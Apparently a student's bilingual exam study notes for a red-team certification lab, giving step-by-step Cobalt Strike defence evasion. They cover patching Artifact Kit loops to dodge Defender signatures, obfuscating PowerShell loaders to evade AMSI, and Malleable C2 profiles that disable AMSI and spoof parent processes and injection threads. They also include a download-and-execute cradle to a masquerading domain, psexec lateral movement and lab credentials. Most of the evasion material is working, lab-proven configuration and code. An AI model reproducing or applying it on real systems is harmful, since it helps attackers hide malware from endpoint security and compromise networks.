# Defense Evasion — Comprendre les contrôles de détection

* Artifacts compilés
* Artifacts de scripts
* Mémoire du Beacon
* Comportement des commandes Beacon
* Cohérence des opérations Post-Exploitation
* Détections sur les lignes de commande

---

## Named Pipes — Deux paramètres distincts

> **Attention :** le listener SMB et les opérations post-exploitation disposent de deux paramètres de named pipes différents.

| Usage | Configuration | Valeur du lab | Remarque |
|------|-----------------|-------------|----------|
| **Communications C2 SMB** | Paramètres du listener dans Cobalt Strike | `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337` | Nom défini dans les paramètres du listener |
| **Sortie fork-and-run** | `post-ex.pipename` dans le Malleable C2 Profile | `dotnet-diagnostic-#####, ########-####-####-####-############` | Valeur utilisée dans le lab — aucune garantie de non-détection |

### Listener SMB — Formats de named pipes

```
# Good — blends with legitimate Windows named pipes:
wkssvc
ntsvcs-<random digits>
netlogon-<random digits>

# Bad — all CS defaults, all detected:
TSVCPIPE-*
msagent_*
postex_*
MSSE-*-server
```

### Format des caractères génériques de `post-ex.pipename`

```
set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
# '#' = random digit substituted at runtime by CS
# Comma-separated = two candidate names, CS uses first available
# dotnet-diagnostic-* blends with .NET CLR runtime pipes present on any Windows/.NET system
```

---

## Compiler de nouveaux artifacts    

```
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

### Signification des paramètres

```
./build.sh <technique> <allocator> <magic_mz_x86> <magic_mz_x64> <rdll_x86> <rdll_x64> <stack_spoof> <output_dir>
```

| # | Paramètre | Valeur d’exemple | Fonction |
|---|-----------|-----------------|---------|
| 1 | `technique` | `mailslot` | Méthode IPC utilisée pour transférer les données au module. Options : `mailslot`, `pipe`, `readfile` |
| 2 | `allocator` | `VirtualAlloc` | Méthode d’allocation mémoire. Options : `VirtualAlloc`, `MapViewOfFile`, `HeapAlloc` |
| 3 | `magic_mz_x86` | `351363` | Remplace les octets magiques `MZ` (4D5A) de l’en-tête DOS x86 ; ils peuvent être restaurés à l’exécution |
| 4 | `magic_mz_x64` | `0` | Paramètre équivalent pour x64 ; `0` conserve la valeur par défaut |
| 5 | `rdll_x86` | `false` | Active le chargement Reflective DLL du payload x86 |
| 6 | `rdll_x64` | `false` | Active le chargement Reflective DLL du payload x64 |
| 7 | `stack_spoof` | `none` | Paramètre de pile d’appels. Options : `none` or a spoofing technique name |
| 8 | `output_dir` | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | Dossier de sortie des artifacts, accessible via `Script Manager` et `artifact.cna` |

### Options de la technique

| Technique | Fonctionnement | OPSEC |
|-----------|-------------|-------|
| `mailslot` | Transfert des données par IPC Windows mailslot | Moins fréquent dans certains référentiels de signatures |
| `pipe` | Communication par named pipe | Fréquent ; plusieurs règles de détection existent |
| `readfile` | Lit le contenu depuis un fichier temporaire | OPSEC-CAUTION — écrit sur le disque |

### Options d’allocation mémoire

| Allocateur | Remarque OPSEC |
|-----------|-----------|
| `VirtualAlloc` | Très utilisé et souvent surveillé par les EDR |
| `MapViewOfFile` | Mapping mémoire adossé à un fichier ; surveillance toujours possible |
| `HeapAlloc` | Allocation sur le tas, au comportement différent des pages RWX |

### Comprendre `magic_mz`

Les fichiers PE Windows débutent normalement par les octets hexadécimaux `4D 5A`, correspondant à **MZ** à l’offset `0x00` :

```
Offset 0x00:  4D 5A 90 00 03 00 ...
              ^^ ^^
              M  Z   ← Defender looks for this at byte 0
```

Les en-têtes PE sont des informations analysables par les moteurs antivirus. Dans ce scénario, `magic_mz` modifie la valeur de l’en-tête de l’artifact :

```
351363 decimal = 0x055C03 hex → first two bytes: 03 5C

On disk: 03 5C ...  ← looks like garbage, not a PE → passes static scan
```

Le code du lab restaure les octets d’origine lors de l’exécution :

```
03 5C ...  →  4D 5A ...  (MZ restored → valid PE loaded and executed)
```

| Étape | Octets à l’offset 0 | Observation possible |
|-------|-------------------|-------------------|
| Sur le disque / analyse initiale | `03 5C` (custom value) | En-tête PE non reconnu sous sa forme habituelle |
| Pendant l’exécution (en-tête restauré) | `4D 5A` (MZ restored) | Exécutable présent en mémoire |

`magic_mz_x64 = 0` conserve l’en-tête MZ d’origine sur x64. Les autres valeurs modifient le comportement étudié dans le lab.

---

**Remarque :** `mailslot`, `HeapAlloc` et `magic_mz` correspondent à des options de l’Artifact Kit ; leur visibilité réelle dépend de l’environnement et des contrôles EDR.

Après la compilation, charger le script Aggressor :

```
Cobalt Strike → Script Manager → Load → <output_dir>/artifact.cna
```

## ThreatCheck  

```dos
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe" 
```  

>ThreatCheck indique les segments signalés par Defender et, lorsqu’il est disponible, un offset hexadécimal.

## Ghidra  

```
ghidraRun.bat
```  

### Étapes d’analyse dans Ghidra :  

1. Créer un projet  

<img src="/images/ghidra01.png" width=600>  

2. Importer le fichier  

<img src="/images/ghidra02.png" width=400>  

3. Ouvrir le fichier importé par double-clic

<img src="/images/ghidra03.png" width=400>  

4. Lancer l’analyse du fichier, puis utiliser l’offset de ThreatCheck dans le menu de navigation **Go to**.  

```
file(0x9CF)
```  

<img src="/images/ghidra04.png" width=600>  

5. Consulter le code décompilé dans le panneau de droite et comparer avec les zones détectées.  

<img src="/images/ghidra05.png" width=800>  

6. Relever les octets hexadécimaux de ThreatCheck, puis les rechercher dans **Search > Memory** de Ghidra pour identifier la zone concernée.  

<img src="/images/ghidra06.png" width=700> 

7. Dans l’exemple du lab, la zone correspond à une boucle du code source. Il faut établir la correspondance entre code décompilé et fichier d’origine.

<img src="/images/ghidra07.png" width=600> 

8. Dans Visual Studio Code, utiliser **Edit > Find in Files** pour retrouver la fonction concernée.  

<img src="/images/ghidra08.png" width=600> 

9. Le lab compare deux variantes d’une boucle afin d’étudier l’effet de la compilation sur les signatures détectées.  

>Compiler de nouveau les templates de l’Artifact Kit, puis relancer ThreatCheck pour comparer les résultats.    
>Noter chaque résultat de ThreatCheck et le comparer aux analyses précédentes.

### ThreatCheck et Ghidra — Méthode d’analyse du lab

**Déroulement du contrôle :**

**1. ThreatCheck — relever l’offset signalé :**
```cmd
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
# Output: Byte[]: 0x00004C20
#         HEX: 31 C0 48 FF C8 ...   ← these are the exact bytes Defender matched
```
L’absence de sortie ne prouve pas l’absence de détection ; une sortie signale une zone à examiner.

**2. Ghidra — accéder à l’offset :**
```
Window → Go To
Enter: 0x4C20    ← use the hex offset from ThreatCheck (must prefix with 0x)
```
La vue désassemblée présente les octets concernés ; le décompilateur affiche une représentation proche du C.

**3. Identifier la boucle concernée :**
Dans l’exemple, la zone correspond à une boucle `for` de traitement XOR dans `patch.c` :
```c
// Signatured — Defender has this bytecode pattern flagged:
for ( int x = 0; x < length; x++ ) {
    buffer[x] = buffer[x] ^ key[x % 8];
}
```
Deux occurrences figurent dans `patch.c` :
- **Line ~45** — boucle du binaire service `.svc.exe`
- **Line ~116** — boucle de l’exécutable standard

**4. Identifier la portion correspondante dans VS Code :**
```
VSCode: File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
Open: src-common\patch.c
```

**Exemple à la ligne ~45 :**
```c
// NEW — backward while-loop (compiles to different bytecode):
int x = length;
while ( x-- ) {
    *( (char *)buffer + x ) = *( (char *)buffer + x ) ^ key[ x % 8 ];
}
```

**Exemple à la ligne ~116 :**
```c
int x = length;
while ( x-- ) {
    *( (char *)ptr + x ) = *( (char *)buffer + x ) ^ key[ x % 8 ];
}
```
> Conserver les versions précédentes dans le suivi Git afin de pouvoir comparer les changements.

**5. Recompiler :**
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

**6. Relancer ThreatCheck :**
```cmd
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
```
- Aucune sortie → le test n’a pas signalé de signature sur cet échantillon.
- Nouvel offset → une autre portion est signalée ; comparer les résultats du test.

**Observations du lab :** plusieurs compilations et contrôles sont présentés ; leur nombre dépend des échantillons.

**Différence de code compilé :** une boucle `while` et une boucle `for` équivalentes peuvent produire des séquences d’instructions différentes. Le lab étudie cette variation dans les résultats d’analyse de ThreatCheck.  

## Resource Kit — Scripts  

>Compiler une nouvelle version des ressources sans modification du code.  

```
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```  

>Analyser le template à l’aide du mode AMSI de ThreatCheck.  

```ps1
.\C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

>Dans le lab, comparer les résultats après une modification de concaténation de chaînes.  

```ps1
('Syst'+'em.dll')
```  

>L’analyse signale ensuite l’utilisation de `Marshal.Copy` ; le lab présente une variante basée sur une API mémoire native.  

```ps1
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```  

>Les contrôles de ThreatCheck ne représentent pas toutes les méthodes de détection ; une autre variante du script est présentée.  
>[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)  

>Le bloc suivant porte sur le contenu de `compress.ps1`.  

```
Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
```  

>Exemple de sortie de la transformation de tokens :  

```
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```  

>Le scénario poursuit avec une version modifiée de `compress.ps1`, suivie d’une nouvelle compilation et analyse.  

## Mémoire du Beacon

Les artifacts `.exe`, `.dll` et `.ps1` du lab chargent le Beacon en mémoire. Les antivirus peuvent analyser la mémoire après exécution ; les alertes peuvent inclure des indicateurs de scan mémoire.

### Mémoire RWX — comprendre le risque de détection

L’allocation d’une région `PAGE_EXECUTE_READWRITE` (RWX) peut constituer un indicateur surveillé. Certaines applications légitimes utilisent également ce type de pages.

```
stage {
    set userwx "false";
    # Allocates RW → copies Beacon → sets per-section perms:
    # .text = RX | .rdata = R | .data = RW
}
```

### En-têtes DLL — signature PE en mémoire

Les en-têtes PE (DOS et NT) restent identifiables en mémoire. Leur présence constitue une caractéristique analysable par les outils de sécurité.

```
stage {
    set copyheaders "false";   # Only .text and .data sections remain
}
```

### Module Stomping — relation avec un module chargé

**Contexte :** une région mémoire sans fichier module correspondant sur disque peut apparaître comme une anomalie dans les outils d’inspection.

Le lab décrit le mapping d’une DLL et l’observation de son association aux régions mémoire.

```
stage {
    set module_x64 "Hydrogen.dll";   # Must be ≥ 512KB to fit Beacon
    set module_x86 "Hydrogen.dll";
}
```

Les exemples utilisent des DLL de `C:\Windows\System32\`. Le comportement dépend de la taille, des sections PE et de leur mapping.

### Chaînes de caractères dans le Beacon

Examiner la DLL Beacon brute pour identifier les chaînes qu’elle contient :

```javascript
// beacon.cna — dump raw DLL via BEACON_RDLL_GENERATE hook
on BEACON_RDLL_GENERATE {
    local('$handle');
    $handle = openf(">beacon_raw.x64.dll");
    writeb($handle, $2);
    closef($handle);
}
```

```bash
# In WSL — dump strings
strings beacon_raw.x64.dll | less
```

Le scénario présente les paramètres du bloc `stage` du Malleable C2 Profile :

```
stage {
    transform-x64 {
        strrep "original string" "replacement";   # New string must be ≤ original length
        # Raw bytes:
        strrep "\x4d\x5a" "\x4e\x5b";
    }
    transform-x86 {
        # Same as x64
    }
}
```

> **Attention :** certaines chaînes sont nécessaires au serveur web interne du Beacon et aux fonctions `powershell-import`, `powerpick` et `psinject`. Leur modification peut empêcher ces commandes de fonctionner.

### Exemple de bloc `stage` du lab

```
stage {
    set userwx      "false";
    set copyheaders "false";
    set obfuscate   "true";
    set cleanup     "true";
    set module_x64  "Hydrogen.dll";
    set module_x86  "Hydrogen.dll";
    transform-x64 {
        # Add strrep entries after strings analysis
    }
}
```

---

## Comportement des commandes Beacon — Catégories OPSEC

### Catégories de commandes

| Catégorie | Fonctionnement | OPSEC |
|-------|-------------|-------|
| **Housekeeping** | Action côté client ou tâche simple du Beacon | Minimal |
| **API-only** | API Windows exécutées dans le thread du Beacon | SAFE — sans nouveau processus |
| **Inline (BOF)** | Code C compilé exécuté dans le thread du Beacon | SAFE — sans nouveau thread |
| **Fork & Run (spawn)** | Création d’un processus temporaire avec sortie via named pipe | CAUTION — nouveau processus, thread et named pipe |
| **Fork & Run (explicit)** | Exécution dans un processus existant | CAUTION — nouveau thread et named pipe |
| **Process execution** | Exécution d’un processus depuis le disque | UNSAFE — processus enfant observable |
| **Service creation** | Crée un service Windows | UNSAFE — Event 7045 |

### API Windows seules (OPSEC-SAFE)
```
pwd  cd  ls  download  upload  getuid  make_token
steal_token  rev2self  kill  exit
```

### BOF / Inline (OPSEC-SAFE — runs in beacon thread, sans nouveau thread)
```
clipboard  getsystem  kerberos_ticket_use  reg  runasadmin uac-cmstplua
jump psexec (BOF component)
```

> L’allocation et la libération de mémoire des BOF dépendent notamment des paramètres `process-inject`.

### Fork-and-run — Création de processus (OPSEC-CAUTION)
```
execute-assembly    # .NET assembly in memory via sacrificial process
powerpick           # Unmanaged PowerShell — no powershell.exe, but spawns spawnto proc
```

### Fork-and-run — Processus explicite (OPSEC-CAUTION)
```
psinject            # powerpick into a specified existing process
```

### Fork-and-run — Deux modes
```
portscan  keylogger  printscreen  desktop  mimikatz
```

### Exécution de processus (OPSEC-UNSAFE)
```
execute    # No output
run        # With output
runas      # Alternate credentials
runu       # Spoofed parent PID
shell      # Via cmd.exe
powershell # Via powershell.exe
```

### Création de service (OPSEC-UNSAFE — événement 7045)
```
elevate svc-exe
jump psexec / psexec64 / psexec_psh
remote-exec psexec
```

> **Service spawnto note:** Service payloads always default to `rundll32`. `post-ex.spawnto` env vars don't resolve in SYSTEM context. Use `ak-settings` in Artifact Kit to set an explicit path instead.

### Malleable C2 — `process-inject` block
Controls how BOFs and fork&run shellcode is injected:

```
process-inject {
    set startrwx    "false";
    set userwx      "false";
    set min_alloc   "16700";
    execute {
        CreateThread "ntdll!RtlUserThreadStart+0x1000";
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
```

### Malleable C2 — `post-ex` block
Controls fork&run sacrificial process and post-ex DLL modifications:

```
post-ex {
    set amsi_disable  "true";
    set spawnto_x64   "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86   "%windir%\\syswow64\\dllhost.exe";
    set obfuscate     "true";
    set smartinject   "true";
    set thread_hint   "ntdll!RtlUserThreadStart+0x1000";
}
```

---

## Blending Post-Ex — PPID Spoofing & spawnto

### The Problem

Beacon inside `msedge.exe` spawning `cmd.exe` or `powershell.exe` as a child = immediately suspicious.

**Rule:** C2 profile `post-ex.spawnto` is a *default only*. Every command must be evaluated against the current beacon's host process context.

### PPID Spoofing — `shell` and `run`

```
beacon> process_browser                 # GUI tab — find PID of desired parent (e.g. explorer.exe), right-click → steal token / inject
beacon> ppid <explorer PID>
beacon> shell whoami                    # Appears as child of explorer.exe
beacon> run net user
```

### spawnto Override — Fork & Run (`execute-assembly`, `powerpick`)

```
beacon> ppid <explorer PID>
beacon> spawnto x64 %windir%\sysnative\notepad.exe
beacon> execute-assembly Rubeus.exe kerberoast /nowrap
```

### Blending Guidelines

| Beacon host process | Appropriate ppid parent | Appropriate spawnto |
|--------------------|------------------------|---------------------|
| `msedge.exe` | `explorer.exe` | `msedge.exe` (another instance) or `dllhost.exe` |
| `outlook.exe` | `explorer.exe` | `dllhost.exe` / `msiexec.exe` |
| `svchost.exe` | `services.exe` | `svchost.exe` / `dllhost.exe` |

HTTP/S Beacon → run inside a process that legitimately makes outbound HTTP requests.

---

## Command-Line Detections (Kernel Callbacks)

### How Defender Blocks at Process Creation

```
Kernel: PsSetCreateProcessNotifyRoutineEx callback
Struct: PS_CREATE_NOTIFY_INFO
  → ImageFileName   (executable path)
  → CommandLine     (full command line — inspected for abuse patterns)
  → CreationStatus  (driver sets STATUS_ACCESS_DENIED to block)
```

Surfaces as **Access Denied** error in beacon output — not a named AV alert.

### Known Blocked Patterns

| Command | Internally runs | Blocked pattern |
|---------|----------------|----------------|
| `pth` | Mimikatz `sekurlsa::pth` | Named pipe impersonation + Mimikatz args |
| `uac-schtasks` (Elevate Kit) | `schtasks.exe /SilentCleanup` | SilentCleanup arg on schtasks.exe command line |

### Bypass Strategy

Cannot disable kernel callbacks without kernel code execution. **Find an alternative that achieves the same result without the flagged command line:**

| Blocked | Alternative |
|---------|------------|
| `schtasks.exe /SilentCleanup` | COM object or API that triggers the task directly |
| `pth` (Mimikatz CLI) | `Rubeus.exe createnetonly` + `ptt` for token impersonation |
| Direct LSASS dump CLI tools | `krb_dump` (Kerbeus-BOF) — Kerberos API, no raw LSASS read; use `dcsync` from DA beacon for NTLM hashes |

You cannot just rely on settings in your C2 profile for post-ex defence evasion.  
Every command you run must blend in based on where your current Beacon is running and what command you want to run.  

---

## Defence Evasion Workflow (Exam Day Order)

```
1. Build Artifact Kit
   → ./build.sh <technique> VirtualAlloc ... ./custom-artifacts
   → C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f artifact64big.exe -e Defender
   → Fix signature in patch.c (recompile to different bytecode)
   → Repeat until clean
   → Load artifact.cna in CS Script Manager

2. Build Resource Kit
   → ./build.sh ./custom-resources
   → C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f template.x64.ps1 -e AMSI -t Script
   → Fix PS1 (string concat, replace Marshal.Copy, obfuscate compress.ps1)
   → Load resources.cna in CS Script Manager

3. Malleable C2 Profile
   → stage { userwx=false, copyheaders=false, module_x64, obfuscate=true }
   → post-ex { amsi_disable=true, spawnto_x64=dllhost.exe }
   → process-inject { userwx=false, execute methods }

4. Test beacon in lab with Defender ON → confirm callback + survival

5. Per-command before execution:
   beacon> ppid <appropriate parent PID>
   beacon> spawnto x64 <contextually appropriate process>
```

---

## OPSEC Quick Reference

```
SAFE:    inline-execute (BOF) | API-only | steal_token | rev2self | powerpick
CAUTION: execute-assembly | portscan | mimikatz (fork&run) | dcsync
UNSAFE:  shell | powershell | run | runas | jump psexec | service creation
```

### Defender Signature Checklist

- [ ] Artifact templates clean (ThreatCheck — Defender engine)
- [ ] PS1 resource templates clean (ThreatCheck — AMSI engine)
- [ ] `stage.userwx false` — no RWX memory
- [ ] `stage.copyheaders false` — no PE headers in memory
- [ ] `stage.module_x64` set — memory backed by legit module
- [ ] Beacon DLL strings reviewed (`strings beacon_raw.x64.dll`)
- [ ] spawnto overridden from default `rundll32.exe`
- [ ] PPID spoofing configured before post-ex commands

---

## LAB-PROVEN CONFIG — Exam Quick Reference

> Exact values from ZPS Defence Evasion lab. Verified working against Defender in Skillable environment.

### Team Server — Profile Location & Restart

```bash
ssh attacker@10.0.0.5          # Password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile            # Edit profile here

# Restart team server (Docker)
sudo /usr/bin/docker restart cobaltstrike-cs-1

# Verify no profile errors
sudo /usr/bin/docker logs cobaltstrike-cs-1
```

### Malleable C2 — stage Block (Lab-Proven)

```
stage {
    set userwx         "false";
    set cleanup        "true";
    set copy_pe_header "false";
    set module_x64     "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}
```

> `strrep` replaces strings in the Beacon DLL before it's loaded. The raw-byte strrep flips a single byte (`\x00` → `\x01`) to break a known signature without breaking functionality.

---

### Malleable C2 — post-ex Block (Lab-Proven)

```
post-ex {
    set spawnto_x64  "%windir%\\sysnative\\werfault.exe";
    set cleanup      "true";
    set pipename     "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint  "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}
```

**Key values:**
| Setting | Value | Why |
|---------|-------|-----|
| `spawnto_x64` | `werfault.exe` | Windows Error Reporting — legitimate, spawns frequently |
| `pipename` | `dotnet-diagnostic-*` | Blends with .NET diagnostic named pipes |
| `thread_hint` | `ntdll.dll!RtlUserThreadStart+0x2c` | Thread start disguised as legitimate ntdll location |
| `amsi_disable` | `true` | Disables AMSI in fork & run post-ex DLLs |

**`strrepex` syntax** (post-ex DLL string replacement — module-scoped):
```
strrepex "<Module>" "<original string>" "<replacement>";
# Module = "PowerPick" or "ExecuteAssembly" — targets specific post-ex DLL
# Replaces error strings that Defender signatures target in those DLLs
```

---

### Malleable C2 — process-inject Block (Lab-Proven)

```
process-inject {
    set allocator      "VirtualAllocEx";
    set bof_allocator  "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc      "8192";
    set startrwx       "false";
    set userwx         "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

**Key values:**
| Setting | Value | Why |
|---------|-------|-----|
| `allocator` | `VirtualAllocEx` | Remote process injection — standard but no RWX |
| `bof_allocator` | `VirtualAlloc` | BOF uses local alloc (no remote process) |
| `bof_reuse_memory` | `true` | Reuses previously allocated BOF memory — reduces alloc events |
| `startrwx` / `userwx` | `false` | No RWX memory at any stage |
| `execute` methods | 4 options listed | CS tries each in order until one succeeds |

---

### Artifact Kit — Exact Lab Steps

**1. Patch `patch.c` in VSCode**

```
File > Open Folder → C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
Open: src-common\patch.c
```

**Line ~45** — svc.exe payload loop (replace):
```c
// OLD (signatured for loop):
// for ( int x = 0; x < length; x++ ) { ... }

// NEW (backwards while loop — different bytecode):
x = length;
while ( x-- ) {
    * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

**Line ~116** — normal .exe payload loop (replace):
```c
// OLD (signatured for loop):
// for ( int x = 0; x < length; x++ ) { ... }

// NEW:
int x = length;
while ( x-- ) {
    * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

> Comment out old code, don't delete — easy rollback if build breaks.

**2. Build in WSL**

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

# Run without args first to confirm minimum stage size for current CS release:
./build.sh

# Build with mailslot bypass:
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

Build output confirmation:
```
[Artifact Kit] [+] You have a x86_64 minge — I will recompile the artifacts
[Artifact Kit] [-] Using allocator: VirtualAlloc
[Artifact Kit] [-] Using STAGE size: 351363
[Artifact Kit] [+] The artifacts for the bypass technique 'mailslot' are saved in '...'
```

**3. Load into CS**

```
Cobalt Strike > Script Manager > Load
→ C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

**4. ThreatCheck after build**

```cmd
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
# Clean = no output. Detected = offset + hex bytes → go fix in patch.c → rebuild
```

---

### Resource Kit — Exact Lab Steps

**1. Build in WSL**

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

**2. Fix `template.x64.ps1` in VSCode**

```
File > Open Folder → C:\Tools\cobaltstrike\custom-resources
Open: template.x64.ps1
```

**Line 5** — break `System.dll` string signature:
```powershell
# Before:
.Equals('System.dll')
# After:
.Equals('Sys'+'tem.dll')
```

**Line 32** — replace `Marshal.Copy` with `WriteProcessMemory`:
```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address kernel32.dll WriteProcessMemory),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))
)
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

**3. Replace `compress.ps1`** with obfuscated version (Invoke-Obfuscation token obfuscation):

```powershell
# Obfuscated compress.ps1 — do NOT change %%DATA%% placeholder:
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

> `%%DATA%%` is the shellcode placeholder — CS patches shellcode into this slot. Never obfuscate or rename it.

**4. ThreatCheck AMSI scan**

```cmd
.\C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
# Clean = "No threat found". Detected = fix the flagged line → re-scan
```

**5. Load into CS**

```
Cobalt Strike > Script Manager > Load
→ C:\Tools\cobaltstrike\custom-resources\resources.cna
```

---

### Service Payload spawnto — `ak-settings`

Service payloads (`jump psexec64`) always default to `rundll32.exe` as spawnto — env vars like `%windir%` don't resolve in SYSTEM context. Override with an explicit path via Artifact Kit:

```
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

Then lateral move:
```
beacon> make_token CONTOSO\rsteel Passw0rd!
beacon> jump psexec64 lon-ws-1 smb
```

---

### Testing — Scripted Web Delivery

```
CS GUI: Attacks > Scripted Web Delivery
Select: http listener → Launch → copy URL
```

On target (Workstation — PowerShell):
```powershell
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/<uri>")
```

New beacon checks in on attacker desktop → confirm `getuid`, check `ps` for Defender processes.

---

### HTTP Listener Host Masquerading — `www.bleepincomputer.com`

> **Exam OPSEC criterion:** "Outbound from unusual processes" — the C2 Host header is part of this.

The `HTTP Hosts` / `HTTP Host (Stager)` value in the CS listener controls what goes in the
HTTP `Host:` header of Beacon's check-in and staging requests. The TCP connection still goes
to the team server IP — only the HTTP header changes.

```
RAW IP (avoid — obvious C2):
  Beacon HTTP request:  Host: 10.0.0.5
  SIEM/proxy sees:      Internal host making HTTP requests to a raw IP → flagged

MASQUERADING (use this):
  Beacon HTTP request:  Host: www.bleepincomputer.com
  SIEM/proxy sees:      Host browsing legitimate security news site → blends in
```

In the ZPS lab environment, internal DNS resolves `www.bleepincomputer.com` → team server IP
(10.0.0.5). You do not configure this — the lab/exam infrastructure handles it.

**Exam day:** Keep the HTTP listener host set to a legitimate-looking domain (lab uses
`www.bleepincomputer.com`). The URL `http://www.bleepincomputer.com/<uri>` in Scripted Web
Delivery is what you run on the foothold workstation to call back to your team server.

**If flagged on network:** change the listener host domain to something more context-appropriate
(a site the target org would legitimately access). In the exam lab this is pre-configured.

---

### Resource Kit — `System.dll` Alternative Bypasses

If ThreatCheck AMSI still detects after `'Sys'+'tem.dll'` substitution, escalate:

```powershell
# Variable + concat:
$s = 'System'; .Equals($s + '.dll')

# Char array join:
.Equals([string]::Join('', @('S','y','s','t','e','m','.','d','l','l')))

